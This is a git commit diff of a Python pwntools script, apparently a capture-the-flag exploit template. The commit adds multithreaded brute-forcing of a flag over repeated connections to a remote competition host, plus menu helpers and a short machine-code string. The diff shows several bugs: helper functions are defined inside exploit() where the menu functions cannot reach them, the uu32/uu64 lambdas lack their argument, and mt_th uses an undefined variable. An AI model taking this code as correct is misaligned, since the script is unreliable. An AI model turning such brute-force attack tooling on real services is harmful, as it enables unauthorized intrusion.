b9de5bf4aa9813ffd9e85247118559a6b41c7bc7
pwnht <05171683@cumt.edu.cn>
2019-11-17 17:59:32 +0800

    add brute

--- exp.py
+++ exp.py
@@ -1,75 +1,140 @@
 #!/usr/bin/env python
 from pwn import *
-io=None
-__author__ = '3summer'
-s       = lambda data            :io.send(str(data)) 
-sa      = lambda delim,data      :io.sendafter(str(delim), str(data))
-sl      = lambda data            :io.sendline(str(data))
-sla     = lambda delim,data      :io.sendlineafter(str(delim), str(data))
-r       = lambda numb=4096       :io.recv(numb)
-ru      = lambda delims,drop=True:io.recvuntil(delims, drop)
-irt     = lambda                  :io.interactive()
-uu32    = lambda data            :u32(data.ljust(4, '\0'))
-uu64    = lambda data            :u64(data.ljust(8, '\0'))
-
+import time
+import threading
 #context.terminal = ['tmux', 'sp', '-h', '-l', '110']
 context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
 context.log_level = 'debug'
 token = ''
-binary='./amazon'
-libc=ELF('./libc-2.27.so')
+binary='../redhat/pwn'
+#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
+multi_thread_num=0x4
+flag=[' ']*multi_thread_num
 ispow=0
+ispow_byte=1
 isremote=0
-isdebug=1
-ip='121.41.38.38'
-port=9999
-def dbg(breakpoint):
-    gdbscript = ''
-    elf_base = 0
-    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
-    gdbscript += 'c\n'
-    log.info(gdbscript)
-    gdb.attach(io, gdbscript)
-    time.sleep(1)
+isdebug=0
+ip='202.119.201.199'
+port=10100
+menu_flag='>'
+code = '\x8b\x01\xc3'
 def b(string='####'):
     raw_input(string)
-def add(index,conut,size,con):
-    sla('Your choice:',1)
-    sla('What item do you want to buy:',str(index))
-    sla('How many:',str(conut))
-    sla('How long is your note',str(size))
-    sa('Content:',con)
-def rm(index):
-    sla("choice",str(3))
-    sla('Which item are you going to pay for:',str(index))
-def wr(address):
-    sla('>>',str(3))
-    sa('What do you want?',address)
-def add666(size):
-    sl(1)
-    sl(size)
-def exploit(io):
-
+def add(index=None,size=None,con=None):
+	sla(menu_flag,1)
+	if index!=None:
+		sla('',str(index))
+	if size!=None:
+		sla('',str(size))
+	if con!=None:
+		sa('',con)
+def rm(index=None):
+	sla(menu_flag,str(3))
+	if index!=None:
+		sla('',str(index))
+def wr(index=None,con=None):
+	sla(menu_flag,str(3))
+	if index!=None:
+		sla('',index)
+	if con!=None:
+		sa('',con)
+def mt_th():
+	thread_list=[]
+	for i in range(multi_thread_num):
+		try:
+			Thread_obj=brute(ispow_byte,i)
+		except:
+			log.info("fail to create thread-{}".format(str(offset)))
+			log.info("bye~~")
+			exit()
+		Thread_obj.start()
+		thread_list.append(Thread_obj)
+	for t in thread_list:
+		t.join()
+def exploit(io=None,offset=None,flag_char=None):
+	__author__ = '3summer'
+	s       = lambda data            :io.send(str(data)) 
+	sa      = lambda delim,data      :io.sendafter(str(delim), str(data))
+	sl      = lambda data            :io.sendline(str(data))
+	sla     = lambda delim,data      :io.sendlineafter(str(delim), str(data))
+	r       = lambda numb=4096       :io.recv(numb)
+	ru      = lambda delims,drop=True:io.recvuntil(delims, drop)
+	irt     = lambda                  :io.interactive()
+	uu32    = lambda                  :u32(data.ljust(4, '\0'))
+	uu64    = lambda                  :u64(data.ljust(8, '\0'))
+class brute(threading.Thread):
+	def __init__(self,ispow_byte=None,offset=None):
+		threading.Thread.__init__(self)
+		self.offset=offset
+		self.ispow_byte=ispow_byte
+	def run(self):
+		if self.ispow_byte:
+			brute.pow_byte(self,self.offset)
+		else:
+			brute.pow(self,self.offset)
+	def pow_byte(self,offset=None):
+		for i in range(0x20,128):
+			io=main()
+			try:
+				if exploit(io,offset,chr(i)):
+					pass
+				else:
+					continue
+			except:
+				io.close()
+				continue
+			break
+		log.info("Thread-{} finish this work".format(str(offset)))
+		global flag
+		flag[offset]=chr(i)
+	def pow(self,offset=None):
+		while True:
+			io=main()
+			try:
+				exploit(io,offset)
+			except:
+				io.close()
+				continue
+			break
 def main(argv=None):
-	global io
+	global isremote
+	global isdebug
+	global context
+	global ip
+	global port
+	io=0
 	if isremote:
-		io=remote(ip,port)
+		if isdebug:
+			context.log_level='debug'
+		else:
+			context.log_level='info'
+		while True:
+			try:
+				io=remote(ip,port)
+			except:
+				log.info("remote:too many requests,I am tried,sleep one second please")
+				sleep(0x10)
+				continue
+			break
 	else:
-		io=process(binary)
+		while True:
+			try:
+				io=process(binary)
+			except:
+				log.info("local:too many process,I can not malloc any memory")
+				log.info("bye~~")
+				exit()
+			break
 		if isdebug:
 			gdb.attach(io)
 	return io
 if __name__ == '__main__':
 	if ispow:
-		while True:
-			try:
-				io= main()
-				exploit(io)
-			except:
-				io.close()
-				continue	
-			break
+		mt_th()
 	else:
 		io=main()
-		exploit(io)
- 	irt()
+		exploit(io,1,'a')
+	flag_fin=''
+	for i in flag:
+		flag_fin+=i
+	print('flag='+flag_fin)
